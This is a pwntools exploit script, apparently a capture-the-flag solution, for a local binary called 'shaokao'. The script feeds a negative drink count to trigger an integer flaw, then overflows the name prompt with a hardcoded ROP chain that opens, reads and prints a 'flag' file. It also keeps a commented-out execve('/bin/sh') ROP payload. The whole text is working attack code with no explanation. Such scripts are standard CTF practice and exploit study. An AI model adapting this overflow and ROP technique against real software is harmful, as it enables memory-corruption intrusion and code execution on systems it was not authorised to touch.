from pwn import *
context.log_level = 'debug'
p=process('./shaokao')
elf=ELF('./shaokao')
context.arch='amd64'
# gdb.attach(p)

p.recvuntil(b'> ')
p.sendline(b'1')
p.recvuntil('3. 勇闯天涯\n'.encode())
p.sendline(b'1')
p.recvuntil('来几瓶？\n'.encode())
p.sendline(b'-9999')
p.recvuntil(b'> ')
p.sendline(b'4')

# 0x00000000004050f4 : pop rdi ; pop rbp ; ret
# 0x000000000040264f : pop rdi ; ret
# 0x00000000004a404a : pop rax ; pop rdx ; pop rbx ; ret
# 0x00000000004a404b : pop rdx ; pop rbx ; ret
# 0x000000000040a67e : pop rsi ; ret
p_rdi=0x000000000040264f
p_rsi=0x000000000040a67e
p_rdx_rbx=0x00000000004a404b
def stack(pay):
    p.recvuntil(b'> ')
    p.sendline(b'5')
    p.recvuntil('请赐名：'.encode())
    # gdb.attach(p)
    pause()
    p.sendline(pay)

ret_addr=0x401bd6
mpro_addr=0x0000000000458B00
change_addr=0x4e6000
change_len=0x3000
gaiming_addr=0x000000000401F5C
name_addr=0x0000000004E60F0
scanf_addr=0x000000000040BF60
write_addr=0x0000000000457E60
open_addr=0x0000000000457C90
read_addr=0x0000000000457DC0
fgets_unlocked_addr=0x000000000041D280
hack_addr=name_addr+0x70
s_addr=0x00000000004B71EB  #%s
bss=elf.bss()+0x200

orw_payload=b'flag\x00'.ljust(0x20,b'\x00')+p64(bss)
orw_payload+=flat([p_rdi,name_addr,p_rsi,0,open_addr])
orw_payload+=flat([p_rdi,3,p_rsi,name_addr+0x200,p_rdx_rbx,0x30,0x30,read_addr])
orw_payload+=flat([p_rdi,1,p_rsi,name_addr+0x200,p_rdx_rbx,0x30,0x30,write_addr])

# #p64(pop_rsp) + p64(rsp) + p64(jmp_rsp)*2 
# payload = '/bin/sh\x00' + 'AAAAAAAA' + 'A'*24 + p64(pop_rax) + p64(59) + p64(pop_rdi) + p64(binsh) + p64(pop_rsi) + p64(0) + p64(pop_rdx_rbx) + p64(0)*2 + p64(syscall)
# p.sendline(payload)
# p.interactive()

stack(orw_payload)
p.interactive()

